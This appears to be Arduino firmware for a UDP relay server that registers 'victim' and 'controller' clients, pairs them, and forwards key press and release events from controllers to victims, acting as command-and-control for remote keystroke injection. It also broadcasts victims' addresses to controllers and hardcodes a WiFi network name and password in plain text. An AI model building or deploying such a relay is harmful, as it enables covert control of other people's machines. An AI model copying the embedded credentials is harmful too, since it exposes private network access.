#include <Arduino.h>
#include "udpClient.hpp"
#include <vector>

/* messages that the server can receive:
r = keep client awake
v = new victim connection
c = new controller connection
p = controller pairs with victim
u = controller un-pairs from victim
n = key-pressed event
m = key-released event
*/

WiFiUDP socket;
unsigned long lastCheck = 0;
unsigned long lastUpdate = 0;
std::vector<UdpClient> clients;

void sendControllers(std::string msg) {
	for (auto c : clients) {
		if (!c.isVictim) {
			socket.beginPacket(c.ip, c.port);
   	 	socket.write(msg.c_str());
    	socket.endPacket();
		}
	}
}

void setup() {
  Serial.begin(9600);

  //check for the WiFi module
  if (WiFi.status() == WL_NO_MODULE) {
    Serial.println("Wifi module not reachable");
    while (true) {};
  }
	//check firmware version
  String fv = WiFi.firmwareVersion();
  if (fv < WIFI_FIRMWARE_LATEST_VERSION) {
    Serial.println("upgrade the WiFi firmware");
  }

	char ssid[] = "FASTWEB-D4756D", pass[] = "TY62M4NM9M";
  //connect to WiFi network
	int status = WL_IDLE_STATUS;
  while (status != WL_CONNECTED) {
    Serial.print("connecting to SSID: ");
    Serial.println(ssid);
    status = WiFi.begin(ssid, pass);
    delay(10000);
  }
  
	Serial.print("connected - local ip: ");
	Serial.print(WiFi.localIP());
	Serial.print(", signal strength: ");
	Serial.print(WiFi.RSSI());
	Serial.println(" dBm");

	//bind udp socket to port
  socket.begin(2390);
	lastCheck = millis();
}

void loop() {
  //if there's data available, read a packet
  int packetSize = socket.parsePacket();
  if (packetSize) {
		//receive the msg and put it in a string
		char buf[30];
    int len = socket.read(buf, 30);
		std::string str = "";
		for (int i = 0; i < len; i++)
			str = str + buf[i];

		bool isNewClient = true;
		//check if the message is from an existing client
		for (auto& c : clients) {
			//if its not the right client, skip it
			if (c.ip != socket.remoteIP() || c.port != socket.remotePort())
				continue;

			//r is used to keep the client awake
			if (str[0] == 'r') {}
			//controller connecting to a victim
			else if (str[0] == 'p' && !c.isVictim) {
				IPAddress ip(str.substr(1, str.find(';')-1).c_str());
				int port = stoi(str.substr(str.find(';')+1, str.size()-1));
				
				//try pairing the controller with the victim
				for (auto& v : clients) {
					if (v.isVictim && v.ip == ip && v.port == port && v.otherIp == "-") {
						v.otherIp = c.ip.toString().c_str();
						v.otherPort = c.port;
						c.otherIp = v.ip.toString().c_str();
						c.otherPort = v.port;
						
						socket.beginPacket(c.ip, c.port);
   	 				socket.write("p");
    				socket.endPacket();
						break;
					}
				}
			}
			//disconnect controller from victim
			else if (str[0] == 'u' && !c.isVictim && c.otherIp != "-") {
				for (auto& o : clients) {
					//if its not the paired client, skip it
					if (o.otherIp != c.ip.toString().c_str() || o.otherPort != c.port)
						continue;
					o.otherIp = "-";
					o.otherPort = 0;
					if (!o.isVictim) {
						socket.beginPacket(o.ip, o.port);
   	 				socket.write("u");
    				socket.endPacket();
					}
					break;
				}
				c.otherIp = "-";
				c.otherPort = 0;
			}
			//forward key pressed-released event
			else if ((str[0] == 'n' || str[0] == 'm') && !c.isVictim && c.otherIp != "-") {
				Serial.println(str.c_str());
				socket.beginPacket(IPAddress(c.otherIp.c_str()), c.otherPort);
   	 		socket.write(str.c_str());
    		socket.endPacket();
			}
			c.isActive = true, isNewClient = false;
			break;
		}
		//if client isnt registered yet
		if (isNewClient) {
			//v = new victiv connection
			if (str[0] == 'v') {
				UdpClient v;
				v.ip = socket.remoteIP();
				v.port = socket.remotePort();
				str.erase(str.begin());
				v.time = stoi(str);
				clients.push_back(v);

				socket.beginPacket(socket.remoteIP(), socket.remotePort());
   	 		socket.write("v");
    		socket.endPacket();

				Serial.print("v: "); 
				Serial.print(v.ip.toString()); 
				Serial.print(":");
				Serial.print(v.port);
				Serial.print(", time: ");
				Serial.println(v.time);
			}
			//c = new controller connection
			else if (str[0] == 'c') {
				UdpClient c;
				c.ip = socket.remoteIP();
				c.port = socket.remotePort();
				str.erase(str.begin());
				c.time = stoi(str);
				c.isVictim = false;
				clients.push_back(c);

				socket.beginPacket(socket.remoteIP(), socket.remotePort());
   	 		socket.write("c");
    		socket.endPacket();

				Serial.print("c: "); 
				Serial.print(c.ip.toString()); 
				Serial.print(":");
				Serial.print(c.port);
				Serial.print(", time: ");
				Serial.println(c.time);
			}
		}
  }

	//check for inactivity
	if (millis() - lastCheck > 5'000) {
		for (int i = 0; i < clients.size(); i++) {
			//disconnect a client if he hasnt been active in 10 secs
			if (!clients[i].isActive) {
				Serial.print(clients[i].ip.toString()); 
				Serial.print(":"); 
				Serial.print(clients[i].port);
				Serial.println(" disconnected due to timeout");

				//if this client is paired, unpair it
				if (clients[i].otherIp != "-") {
					for (auto& o : clients) {
						//if its not the paired client, skip it
						if (o.otherIp != clients[i].ip.toString().c_str() || o.otherPort != clients[i].port)
							continue;
						o.otherIp = "-";
						o.otherPort = 0;
						if (!o.isVictim) {
							socket.beginPacket(o.ip, o.port);
   	 					socket.write("u");
    					socket.endPacket();
						}
						break;
					}
				}
				clients.erase(clients.begin() + i);
				i--;
			}
			else {
				clients[i].isActive = false;
			}
		}
		lastCheck = millis();
	}
	//send client list
	if (millis() - lastUpdate > 3'000) {
		sendControllers("e");
		for (auto c : clients) {
			std::string msg = "";
			msg = (c.isVictim) ? "l" : "n";
			msg = msg + c.ip.toString().c_str() + ';'+ c.otherIp.c_str() + ';';
			msg = msg + std::to_string(c.port) + ';'+ std::to_string(c.otherPort) + ';';
			msg = msg + std::to_string(c.time) + ';';
			sendControllers(msg);
		}
		sendControllers("d");
		lastUpdate = millis();
	}
}